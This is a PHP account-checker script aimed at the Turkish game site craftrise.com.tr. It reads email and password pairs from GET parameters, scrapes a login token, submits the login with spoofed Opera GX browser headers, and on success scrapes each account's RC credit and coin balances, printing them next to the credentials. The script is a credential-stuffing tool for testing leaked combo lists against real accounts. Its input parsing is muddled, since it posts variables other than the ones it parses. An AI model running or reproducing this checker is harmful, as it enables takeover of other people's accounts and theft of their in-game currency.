<?php
error_reporting(0);

if (file_exists(getcwd().'/cerez.txt')) {
    unlink(getcwd().'/cerez.txt');
}


extract($_GET);
$istek= str_replace(array(":", ";", ",", "|", "�", "/", "\\", " "), ":", $istek);
$istek= str_replace(array("||", "|||"), ":", $istek);
$istek= str_replace(array("||", "|||"), ":", $istek);
$istek= str_replace(array("||", "|||"), ":", $istek);
$istek= str_replace(array("||", "|||"), ":", $istek);
$ayirici = explode("|", $istek);
$email = trim($ayirici[0]);
$pass = trim($ayirici[1]);


$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => "https://www.craftrise.com.tr/anasayfa",
CURLOPT_POST => 0,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_FOLLOWLOCATION => 1,
CURLOPT_HTTPHEADER => array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'cache-control: max-age=0',
    'referer: https://www.craftrise.com.tr/kayit',
    'sec-ch-ua: "Opera GX";v="77", "Chromium";v="91", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275'
),
CURLOPT_COOKIEJAR => getcwd().'/cerez.txt',
CURLOPT_COOKIEFILE => getcwd().'/cerez.txt',
));
$fim = curl_exec($ch);





$ahahazekioc = explode("openLoginBox('", $fim);
$ahahazekioc = explode("')", $ahahazekioc[1]);

$tokenxD = $ahahazekioc[0];





$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => "https://www.craftrise.com.tr/posts/post-login.php",
CURLOPT_POST => 1,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_FOLLOWLOCATION => 1,
CURLOPT_HTTPHEADER => array(
   'accept: */*',
   'content-type: application/x-www-form-urlencoded; charset=UTF-8',
   'origin: https://www.craftrise.com.tr',
   'referer: https://www.craftrise.com.tr/',
   'sec-ch-ua: "Opera GX";v="77", "Chromium";v="91", ";Not A Brand";v="99"',
   'sec-ch-ua-mobile: ?0',
   'sec-fetch-dest: empty',
   'sec-fetch-mode: cors',
   'sec-fetch-site: same-origin',
   'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275',
   'x-requested-with: XMLHttpRequest'
),
CURLOPT_COOKIEJAR => getcwd().'/cerez.txt',
CURLOPT_COOKIEFILE => getcwd().'/cerez.txt',
CURLOPT_POSTFIELDS => 'value='.$cc.'&password='.$mes.'&token='.$tokenxD.''
));
$fim = curl_exec($ch);

$cozbunu = json_decode($fim, true);


$logindurum = $cozbunu['resultMessage'];




if(strpos($fim, 'Giriş başarılı, yönlendiriliyorsunuz.') == true) {

$ch = curl_init();
curl_setopt_array($ch, array(
CURLOPT_URL => "https://www.craftrise.com.tr/market",
CURLOPT_POST => 0,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_FOLLOWLOCATION => 1,
CURLOPT_HTTPHEADER => array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'cache-control: max-age=0',
    'referer: https://www.craftrise.com.tr/profil',
    'sec-ch-ua: "Opera GX";v="77", "Chromium";v="91", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275'
),
CURLOPT_COOKIEJAR => getcwd().'/cerez.txt',
CURLOPT_COOKIEFILE => getcwd().'/cerez.txt',
));
$fim = curl_exec($ch);

$mevcutrece = explode('id="currentCredits">', $fim);
$mevcutrece = explode("</span>", $mevcutrece[1]);

$mevcutrc = $mevcutrece[0];


$mevcutkoyin = explode("Gotham-Book'; text-align: center;\">", $fim);
$mevcutkoyin = explode('</td>', $mevcutkoyin[1]);

$mevcutcoin = $mevcutkoyin[0];


echo "Giriş Başarılı :) -> $email - $pass --> Mevcut RC: $mevcutrc --> Mevcut Coin: $mevcutcoin";

}else{

echo "Giriş Başarısız :( -> $email - $pass --> $logindurum <br>";

}





?>